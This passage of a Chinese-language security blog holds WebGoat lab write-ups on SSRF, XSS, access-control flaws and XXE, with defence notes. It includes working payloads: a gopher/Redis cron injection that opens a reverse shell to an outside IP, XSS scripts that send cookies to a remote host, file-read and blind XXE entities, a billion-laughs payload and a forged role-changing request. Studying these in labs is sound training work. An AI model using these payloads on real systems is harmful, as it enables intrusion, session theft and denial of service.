<li>0x08<br>创建一个已csrf–当前用户名的新帐号即可</li>
</ul>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><p>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p>
<ul>
<li>SSRF的危害<br>内外网的端口和服务扫描<br>向内部任意主机的任意端口发送精心构造的Payload<br>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）<br>攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）<br>利用file协议读取本地文件等<br>内外网主机应用程序漏洞的利用<br>内外网Web站点漏洞的利用</li>
<li>SSRF漏洞的寻找<br>1）分享：通过URL地址分享网页内容<br>2）转码服务<br>3）在线翻译<br>4）图片加载与下载：通过URL地址加载或下载图片<br>5）图片、文章收藏功能<br>6）未公开的api实现以及其他调用URL的功能<br>7）从URL关键字中寻找</li>
<li>SSRF漏洞的验证方法：<br>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过<strong>抓包分析发送的请求是否是由服务器的发送的</strong>，从而来判断是否存在SSRF漏洞<br>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞</a></li>
<li>漏洞利用<br>1.本地利用</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dict protocol (操作Redis)</span></span><br><span class="line">curl -vvv <span class="string">'dict://127.0.0.1:6379/info'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file protocol (任意文件读取)</span></span><br><span class="line">curl -vvv <span class="string">'file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gopher protocol (一键反弹Bash)</span></span><br><span class="line"><span class="comment"># * 注意: 链接使用单引号，避免$变量问题</span></span><br><span class="line">curl -vvv <span class="string">'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'</span></span><br></pre></td></tr></table></figure>
<p>2.远程利用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">                $ch = curl_init();</span><br><span class="line">                curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">                curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">                curl_exec($ch);</span><br><span class="line">                curl_close($ch); </span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>防御方法<br>限制协议为HTTP、HTTPS<br>不用限制302重定向<br>设置URL白名单或者限制内网IP</li>
</ul>
<blockquote>
<p><a href="https://www.jianshu.com/p/86bb349baac1" target="_blank" rel="noopener">SSRF</a></p>
</blockquote>
<h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><ul>
<li>0x02<br><img src="https://img-blog.csdnimg.cn/20200721213402668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>0x02<br><img src="https://img-blog.csdnimg.cn/20200721213624615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Webgoat - xss</title>
    <url>/2020/08/21/Webgoat%20-%20xss/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>XSS全称Cross-site script（跨站脚本攻击），是在允许使用html和script标签作为输入时未进行编码和过滤显示在页面时导致的漏洞</p>
<ul>
<li>分类</li>
</ul>
<p> 1.反射性<br>    攻击者将包含恶意代码的连接发送给受害者（利用社工技术），受害者在点击链接后将恶意代码提交给服务器，服务器将将恶意脚本显示在页面上导致恶意代码在浏览器执行，使得攻击者窃取受害者数据或控制浏览器<br>      2.存储性<br>      攻击者将包含恶意代码的数据提交给服务器进行存储，当用户访问显示恶意代码数据的页面时，导致恶意代码在浏览器执行，使得攻击者窃取受害者数据或控制浏览器<br>      3.DOM-based<br>      发生在js写入到html过程中，使用js将用户提交的恶意内容写入html时，导致恶意代码执行，与反射型xss攻击手法类似，<strong>区别在于恶意脚本直接被js执行而不是通过提交到服务端再通过响应结果执行</strong></p>
<ul>
<li><p>常见攻击位置<br> 回显用户数据的搜索框<br> 回显用户数据的输入框<br> 显示用户输入的错误信息<br> 包含用户数据的隐藏标签<br> 显示用户数据的任何页面，例如留言框和自由格式的评论框<br> HTTP header</p>
</li>
<li><p>危害<br>窃取会话的cookie信息<br>创建虚假的请求<br>创建虚假字段用户收集用户的凭据<br>重定向页面到其他页面<br>创建伪造用户的请求<br>窃取机密信息<br>在用户系统上执行恶意脚本<br>在网页插入恶意代码<br>网络钓鱼（在url中插入合法的域名）</p>
</li>
<li><p>防御<br>对(服务器端和客户端js)输出到html/script标签中的<strong>数据进行编码(不要使用黑名单过滤)</strong><br>server-&gt;html：使用html encoder编码为html实体<br>server-&gt;js：使用js encoder进行编码<br>js-&gt;html：使用html encoder编码为html实体</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2></li>
<li><p>0x02<br><img src="https://img-blog.csdnimg.cn/20200716203400304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200716203403274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>两次获得一样的cookie<br><img src="https://img-blog.csdnimg.cn/20200716203512308.png" alt="在这里插入图片描述"></p>
</li>
<li><p>0x07<br><strong>字段是否容易受到XSS攻击的简单方法是使用alert（）或console.log（）方法。</strong><br><img src="https://img-blog.csdnimg.cn/20200716204830736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>0x10<br><img src="https://img-blog.csdnimg.cn/20200716212913426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现路由存在参数传递<br><img src="https://img-blog.csdnimg.cn/20200716213014669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>test路由调用了lessonController控制器模块下的testHandler()函数<br><img src="https://img-blog.csdnimg.cn/20200716213038169.png" alt="在这里插入图片描述"><br>定位到lessonController控制器<br><img src="https://img-blog.csdnimg.cn/2020071621315039.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ul>
<p>testHandler()调用lessonContentView.showTestParam(param)函数<img src="https://img-blog.csdnimg.cn/20200716213230567.png" alt="在这里插入图片描述"><br>再次定位<br><img src="https://img-blog.csdnimg.cn/20200716213315525.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200716213347705.png" alt="在这里插入图片描述"><br>发现该函数直接将test路由传递过来的参数直接显示到页面上，存在XSS<br><img src="https://img-blog.csdnimg.cn/20200716213616898.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>0x11<br>利用方式  &lt; img src=”” onerror=’alert(webgoat.customjs.phoneHome())’&gt;<br><img src="https://img-blog.csdnimg.cn/20200716214424724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li>
<li><p>使用场景<br>直接嵌入HTML     &lt; script&gt;alert(‘XSS’)&lt;/ script&gt;<br>元素便签事件     &lt; body onload=alert(‘XSS’)&gt; ,&lt; img src=”” onerror=’alert(“xss”)’&gt;<br>图片标签             &lt; img src=”javascript:alert(‘XSS’);”&gt;<br>其他标签            &lt; iframe&gt;, &lt; div&gt;,&lt; link&gt;</p>
</li>
<li><p>利用POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检测是否存在XSS漏洞</span></span><br><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span> )&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href=" onclick=alert('xss')&gt;type&lt;/</span>a&gt;</span><br><span class="line">&lt;img src=http:<span class="comment">//1.1.1.1/a.jpg onerror=alert('xss')&gt;</span></span><br><span class="line"><span class="comment">//利用xss实现页面重定向</span></span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">'http://1.1.1.1'</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;iframe SRC="http:/</span><span class="regexp">/1.1.1.1 /</span>victim<span class="string">" height = "</span><span class="number">0</span><span class="string">" width ="</span><span class="number">0</span><span class="string">"&gt; &lt;/iframe&gt;</span></span><br><span class="line"><span class="string">//获取受害者cookie</span></span><br><span class="line"><span class="string">&lt;script&gt;new lmage(). src-="</span>http:<span class="comment">//1.1.1.1/c.php?output="+document.cookie;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">//实现页面内容篡改</span></span><br><span class="line">&lt;script&gt;<span class="built_in">document</span>.body.innerHTML=<span class="string">"&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;"</span>;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//窃取cookie，在肉鸡上存放js脚本，让受害者访问肉鸡上的脚本</span></span><br><span class="line">&lt;script src=http:<span class="comment">//1.1.1.1/a.js&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="comment">//a.js 源码</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://1.1.1.1 /cookies.php?cookie="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Webgoat--访问控制缺陷</title>
    <url>/2020/08/21/Webgoat--%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%BC%BA%E9%99%B7/</url>
    <content><![CDATA[<h2 id="不安全的直接对象引用-（IDOR水平权限越权）"><a href="#不安全的直接对象引用-（IDOR水平权限越权）" class="headerlink" title="不安全的直接对象引用 （IDOR水平权限越权）"></a>不安全的直接对象引用 （IDOR水平权限越权）</h2><ul>
<li>定义</li>
</ul>
<p>不安全的直接对象引用（IDOR）允许攻击者绕过网站的身份验证机制，并通过修改指向对象链接中的参数值来直接访问目标对象资源，这类资源可以是属于其他用户的数据库条目以及服务器系统中的隐私文件等等。<br>应用程序在SQL查询语句中直接使用了未经测试的数据，而攻击者可以利用这一点来访问数据库中的其他账号数据。</p>
<ul>
<li><p>出现原因<br>Web应用往往在生成Web页面时会用它的真实名字，且并不会对所有的目标对象访问时来检查用户权限，所以这就造成了不安全的对象直接引用的漏洞。<br>服务器上的具体文件名、路径或数据库关键字等内部资源被暴露在URL或网页中，攻击者可以尝试直接访问其他资源。</p>
<h2 id="缺失功能级访问控制-垂直权限-提权"><a href="#缺失功能级访问控制-垂直权限-提权" class="headerlink" title="缺失功能级访问控制(垂直权限 提权)"></a>缺失功能级访问控制(垂直权限 提权)</h2><p>在应用程序中，常常会将用户分为不同的用户角色，不同的角色可以进行不同权限的操作。当在逻辑代码中未妥善处理，可能导致低权限的角色用户可以调用高权限角色用户的接口，导致用户提权</p>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p> 修改提交的参数<br> 暴力破解猜测同级的用户<br> 使用PUT提交修改个人信息</p>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1.访问检查：对任何来自不受信源所使用的所有对象进行访问控制检查<br>2.使用基于用户或会话的间接对象访问，这样可防止攻击者直接攻击未授权资源<br>3.避免在url或网页中直接引用内部文件名或数据库关键字<br>4.验证用户输入和url请求，拒绝包含./ …/的请求<br>5.在应用程序业务层添加用户水平权限验证，防止角色平级用户之间数据越权访问<br>6.在应用程序业务层添加用户垂直权限验证，防止提权<br>7.针对当前用户信息修改，可使用已经经过验证并存储在sesson中的用户信息，避免从客户端进行获取<br>8.对于高权限可以修改低权限情况，添加权限验证<br>9.针对用户操作记录审计日志，操作对象，操作人，操作时间，操作IP地址，操作前后变化</p>
</li>
</ul>
<h2 id="0x13"><a href="#0x13" class="headerlink" title="0x13"></a>0x13</h2><p>点击View profie，抓包重重放<img src="https://img-blog.csdnimg.cn/20200617202028289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获得 role，userId</p>
<h2 id="0x14"><a href="#0x14" class="headerlink" title="0x14"></a>0x14</h2><p><img src="https://img-blog.csdnimg.cn/20200617203153839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="0x15"><a href="#0x15" class="headerlink" title="0x15"></a>0x15</h2><ul>
<li>爆破<br><img src="https://img-blog.csdnimg.cn/20200617210110626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200617210120153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200617210157481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>02 构造数据包</li>
</ul>
<p>使用PUT 方式提交更改的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUT /WebGoat/IDOR/profile/2342388 HTTP/1.1</span><br><span class="line">Host: 192.168.80.2:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.80.2:8080/WebGoat/start.mvc</span><br><span class="line">Content-Type: application/json</span><br><span class="line">X-Requested-With: application/json</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: JSESSIONID=eU5_lnpkJPYm5b8TPDxefKZS2MxfK0xlAi2MSl1Z</span><br><span class="line">Content-Length: 86</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"role"</span>:<span class="string">"1"</span>, <span class="string">"color"</span>:<span class="string">"red"</span>, <span class="string">"size"</span>:<span class="string">"large"</span>, <span class="string">"name"</span>:<span class="string">"Buffalo Bill"</span>, <span class="string">"userId"</span>:<span class="string">"2342388"</span>&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200617212906753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="0x22"><a href="#0x22" class="headerlink" title="0x22"></a>0x22</h2><p><img src="https://img-blog.csdnimg.cn/20200617221619892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200617221444226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200617221544191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="0x23"><a href="#0x23" class="headerlink" title="0x23"></a>0x23</h2><p><img src="https://img-blog.csdnimg.cn/20200617224044179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>Webgoat --XEE</title>
    <url>/2020/08/21/Webgoat%20--XEE/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
<li><p>XMl定义<br>XML由3个部分构成，它们分别是：<br>文档类型定义（Document Type Definition，DTD），即XML的布局语言；<br>可扩展的样式语言（Extensible Style Language，XSL），即XML的样式表语言；<br>可扩展链接语言（Extensible Link Language，XLL）。<br>XML:可扩展标记语言，是一种用于标记电子文件使其具有结构性的标记语言。<br>可扩展标记语言(XML)和超文本标记语言(HTML)为不同的目的而设计<br><strong>XML</strong>被设计用来传输和存储数据，其焦点是<strong>数据的内容</strong>。<br><strong>HTML</strong>被设计用来显示数据，其焦点是<strong>数据的外观</strong></p>
</li>
<li><p>XML的作用<br>XML使用元素和属性来描述数 据。在数据传送过程中，XML始终保留了诸如父/子关系这样的数据结构。几个应用程序 可以共享和解析同一个XML文件，不必使用传统的字符串解析或拆解过程。</p>
</li>
<li><p>引用外部DTD</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM <span class="string">"文件名"</span>&gt;</span><br><span class="line"> 或</span><br><span class="line"> <span class="comment">#SYSTEM标识符意味着该实体将从外部来源获取内容，调用外部资源,而这里是支持很多的协议,如:http;file等</span></span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC <span class="string">"public_ID"</span> <span class="string">"文件名"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>外部实体类型有<br><img src="https://img-blog.csdnimg.cn/20200615202024851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>CDATA<br>CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）<br>在 XML 元素中，”&lt;” （新元素的开始）和 “&amp;” （字符实体的开始）是非法的。<br>某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。<br>CDATA 部分中的所有内容都会被解析器忽略。<br>CDATA 部分由 “<![CDATA[" 开始，由 "]]>“ 结束</p>
</li>
<li><p>xml的实体–参数实体</p>
</li>
</ul>
<p> <strong>只有在DTD中才能引用参数实体</strong><br> 该类型的实体用“％”字符（或十六进制编码的％）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 <span class="string">"实体的值"</span>&gt;</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % param1 <span class="string">"&lt;!ENTITY internal 'http://evil.com'&gt;"</span>&gt;</span><br><span class="line">%param1;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;<span class="built_in">test</span>&gt;[This is my site] &amp;internal;&lt;/<span class="built_in">test</span>&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#先执行%param1; 再执行 &amp;internal;</span></span><br></pre></td></tr></table></figure>
<p><strong>参数实体在DTD中解析优先级高于xml内部实体</strong><br>参数实体特性<br>1）只能在DTD内部<br>2）立即引用<br>3）实体嵌套</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;  //XML 声明</span><br><span class="line">&lt;!DOCTYPE user [					    //XML文档定义 DTD</span><br><span class="line">  &lt;!ELEMENT user(name,age) &gt;	</span><br><span class="line">  &lt;!ELEMENT name (<span class="comment">#PCDATA)&gt;		       //XML 约束</span></span><br><span class="line">  &lt;!ELEMENT age (<span class="comment">#PCDATA)&gt;		       </span></span><br><span class="line">  &lt;!ENTITY name <span class="string">"Jo Smith"</span>&gt;			   //XML实体</span><br><span class="line">  &lt;!ELEMENT age <span class="string">"20"</span> &gt;		       </span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;								//XML文档</span><br><span class="line">  &lt;name&gt;&amp;name;&lt;/name&gt;				//xml 实体引用</span><br><span class="line">  &lt;age&gt;&amp;age;&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>XEE<br>XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
</li>
<li><p>攻击方式</p>
</li>
</ul>
<p> <strong>SYSTEM 获取服务器目录或文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE author [</span><br><span class="line">  &lt;!ENTITY js SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;js;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
<p><strong>更改内容类型绕过</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Content-Type: application/xml			<span class="comment">#更改内容类型</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> ?&gt;&lt;!DOCTYPE user [&lt;!ENTITY root SYSTEM <span class="string">"file:///"</span>&gt; ]&gt;&lt;comment&gt;&lt;text&gt;&amp;root;&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<p> <strong>拒绝服务攻击</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line"> &lt;!ENTITY lol <span class="string">"lol"</span>&gt;</span><br><span class="line"> &lt;!ELEMENT lolz (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line"> &lt;!ENTITY lol1 <span class="string">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span>&gt;</span><br><span class="line"> &lt;!ENTITY lol2 <span class="string">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"</span>&gt;</span><br><span class="line"> &lt;!ENTITY lol3 <span class="string">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span>&gt;</span><br><span class="line"> &lt;!ENTITY lol4 <span class="string">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span>&gt;</span><br><span class="line"> &lt;!ENTITY lol5 <span class="string">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span>&gt;</span><br><span class="line"> &lt;!ENTITY lol6 <span class="string">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span>&gt;</span><br><span class="line"> &lt;!ENTITY lol7 <span class="string">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span>&gt;</span><br><span class="line"> &lt;!ENTITY lol8 <span class="string">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span>&gt;</span><br><span class="line"> &lt;!ENTITY lol9 <span class="string">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
<p> <strong>盲注</strong>–在数据无回显时可以使用盲注方式将数据发送到远程攻击服务器<br>通过在执行自己的服务器上外部XML，判断是否执行了XEE<br>可使用该网站接受信息 <a href="http://ceye.io/payloads" target="_blank" rel="noopener">http://ceye.io/payloads</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地服务器保存 名为attack.dtd 的XML文件</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;!ENTITY ping SYSTEM <span class="string">'http://192.168.80.2:9090/landing'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改提交XML表单</span></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://192.168.80.2:9090/WebWolf/files/attack.dtd"</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;</span><br><span class="line">  &lt;text&gt;<span class="built_in">test</span>&amp;ping;&lt;/text&gt;</span><br><span class="line">&lt;/comment&gt;</span><br></pre></td></tr></table></figure>
<p><strong>探测内网地址</strong></p>
